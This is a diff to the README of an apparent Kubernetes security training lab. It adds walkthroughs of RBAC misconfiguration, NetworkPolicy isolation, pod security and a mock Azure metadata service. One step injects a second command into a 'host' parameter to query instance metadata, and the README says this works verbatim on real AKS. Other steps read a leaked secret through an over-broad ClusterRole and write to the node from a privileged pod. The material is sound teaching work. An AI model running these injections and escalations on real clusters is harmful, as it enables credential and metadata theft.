@@ -10,8 +10,8 @@ NetworkPolicy (default-deny + scoped allow), the Kubernetes API server, cloud me
 services (a local Azure IMDS simulation), Pod Security (restricted vs. privileged), and
 static analysis with Kubescape.
 
-Every command in this repo has actually been run against a real cluster — see `slides.md`
-for the tested output alongside each step.
+Every command in this repo has actually been run against a real cluster — the walkthrough
+below includes the tested output alongside each step.
 
 > ⚠️ This repo contains an intentionally vulnerable application and intentionally
 > over-permissioned RBAC/Pod configs. Only run it in an isolated training cluster
@@ -94,16 +94,106 @@ kubectl delete pod pwned-via-rbac -n default   # clean up before moving on
 
 ## Standalone demos
 
-| Folder | What it shows |
-|---|---|
-| `manifests/02-rbac-can-i/` | Namespaced Role/RoleBinding — grant `list`, then narrow it to `get`, verified live with `kubectl auth can-i` |
-| `manifests/03-rbac-popquiz-live/` | A `ClusterRole`+`ClusterRoleBinding` misconfig proven to leak a secret across namespaces, then fixed with a namespaced `Role` |
-| `manifests/04-network-policy/` | Two tenants on a flat network (fully open) → `default-deny-all` (fully blocked) → scoped `allow-from-tenant-1` (restored for just one path) |
-| `manifests/05-metadata/` | Local stand-in for the Azure Instance Metadata Service, since minikube isn't an Azure VM — same request shape works verbatim against the real `169.254.169.254` on AKS |
-| `manifests/06-pod-security/` | `restricted-pod` (can't touch the host at all) vs. `dangerous-pod` (privileged + hostPath, writes straight to the node) |
+### RBAC: allow → deny (`manifests/02-rbac-can-i/`)
 
-Commands for each are in `slides.md`, in the matching "Demo:" slide, with the actual
-tested output included.
+Deployed by `setup.sh`. A namespaced `Role`/`RoleBinding` granting `get`+`list` on pods,
+then narrowed to `get` only:
+
+```bash
+kubectl auth can-i list pods --as=system:serviceaccount:demo:demo-sa -n demo
+# → yes
+
+kubectl apply -f manifests/02-rbac-can-i/role-deny.yaml
+
+kubectl auth can-i list pods --as=system:serviceaccount:demo:demo-sa -n demo
+# → no   (tested)
+kubectl auth can-i get pods --as=system:serviceaccount:demo:demo-sa -n demo
+# → yes  (tested)
+
+# a real API call as the SA, not just a can-i check
+kubectl get pods -n demo --as=system:serviceaccount:demo:demo-sa
+# → Error from server (Forbidden): ... cannot list resource "pods" ...
+```
+
+### RBAC pop quiz, proven live (`manifests/03-rbac-popquiz-live/`)
+
+Deployed by `setup.sh`: an over-broad `ClusterRole`+`ClusterRoleBinding` (`app-sa` in
+`default`) next to a "victim" secret in a totally unrelated `database` namespace.
+
+```bash
+kubectl auth can-i get secrets --as=system:serviceaccount:default:app-sa -n database
+# → yes   (tested — app-sa has nothing to do with "database")
+
+kubectl get secret db-credentials -n database -o jsonpath='{.data.password}' \
+  --as=system:serviceaccount:default:app-sa | base64 -d
+# → SuperSecretProdPassword123!   (tested)
+```
+
+Fix it live with a namespaced `Role`/`RoleBinding` instead:
+
+```bash
+kubectl delete clusterrole app-reader
+kubectl delete clusterrolebinding app-reader-binding
+kubectl apply -f manifests/03-rbac-popquiz-live/fixed-role.yaml
+
+kubectl auth can-i get secrets --as=system:serviceaccount:default:app-sa -n database
+# → no   (tested: blocked)
+kubectl auth can-i get pods --as=system:serviceaccount:default:app-sa -n default
+# → yes  (tested: still works for what it actually needs)
+```
+
+### NetworkPolicy: flat network → default-deny → scoped allow (`manifests/04-network-policy/`)
+
+Deployed by `setup.sh`: two tenants, no policy yet.
+
+```bash
+POD1=$(kubectl -n tenant-1 get pod -l app=nginx -o jsonpath='{.items[0].metadata.name}')
+
+kubectl -n tenant-1 exec $POD1 -- wget -qO- http://nginx.tenant-2.svc.cluster.local:8080
+# → full HTML response   (tested — flat network, nothing stops it)
+
+kubectl apply -f manifests/04-network-policy/np-default-deny.yaml
+kubectl -n tenant-1 exec $POD1 -- wget -qO- -T 5 http://nginx.tenant-2.svc.cluster.local:8080
+# → wget: download timed out   (tested)
+
+kubectl apply -f manifests/04-network-policy/np-allow-from-tenant1.yaml
+kubectl -n tenant-1 exec $POD1 -- wget -qO- -T 5 http://nginx.tenant-2.svc.cluster.local:8080
+# → HTML response again   (tested — restored for just this path)
+
+# confirm it's scoped, not reopened - a third namespace stays blocked
+kubectl run prober --image=busybox:1.36 -n default -- sleep 3600
+kubectl -n default exec prober -- wget -qO- -T 5 http://nginx.tenant-2.svc.cluster.local:8080
+# → wget: download timed out   (tested)
+```
+
+### Local Azure IMDS simulation (`manifests/05-metadata/`)
+
+Deployed by `setup.sh`. Minikube isn't an Azure VM, so the real `169.254.169.254` won't
+respond here — this mock returns Azure-IMDS-shaped JSON at the same paths.
+
+```bash
+# through the same injection used for the main attack chain
+curl -s -G "http://localhost:5000/ping" --data-urlencode \
+  'host=127.0.0.1; curl -s -H "Metadata:true" "http://mock-azure-imds/metadata/instance?api-version=2021-02-01"'
+# → {"compute":{"azEnvironment":"AzurePublicCloud","location":"westeurope", ...}}   (tested)
+```
+
+On real AKS, the same command works verbatim against `169.254.169.254` instead of
+`mock-azure-imds` — only the local simulation here has actually been verified.
+
+### Pod Security: restricted vs. privileged (`manifests/06-pod-security/`)
+
+Deployed by `setup.sh`. Same command, two pods, one flag (`privileged: true`) and one
+volume mount (`hostPath`) apart:
+
+```bash
+kubectl exec restricted-pod -n default -- sh -c 'echo test > /etc/shadow'
+# → Permission denied   (tested)
+
+kubectl exec dangerous-pod -n default -- sh -c 'echo hi > /host/DEMO-PROOF.txt'
+minikube ssh -- cat /DEMO-PROOF.txt
+# → hi   (tested — landed on the real node, not just the container)
+```
 
 ## Kubescape (shift-left)
 
@@ -127,7 +217,6 @@ manifests/04-network-policy/  tenant isolation demo
 manifests/05-metadata/        local Azure IMDS simulation
 manifests/06-pod-security/    restricted vs. privileged pod
 setup.sh / teardown.sh        environment lifecycle
-slides.md                     the full session deck, with tested output inline
 ```
 
 ## Notes for instructors
